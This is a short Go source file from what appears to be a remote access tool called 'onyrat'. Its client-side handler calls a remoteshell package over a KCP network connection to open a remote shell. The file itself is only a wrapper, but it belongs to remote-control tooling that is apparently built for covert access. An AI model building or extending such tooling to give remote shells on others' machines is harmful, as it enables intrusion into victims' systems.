//go:build client
// +build client

package handlers

import (
	"fmt"

	"github.com/Onyz107/onyrat/pkg/commands/remoteshell"
	"github.com/Onyz107/onyrat/pkg/network"
)

func HandleShell(c *network.KCPClient) error {
	if err := remoteshell.SendShell(c); err != nil {
		return fmt.Errorf("failed to establish shell connection: %w", err)
	}

	return nil
}
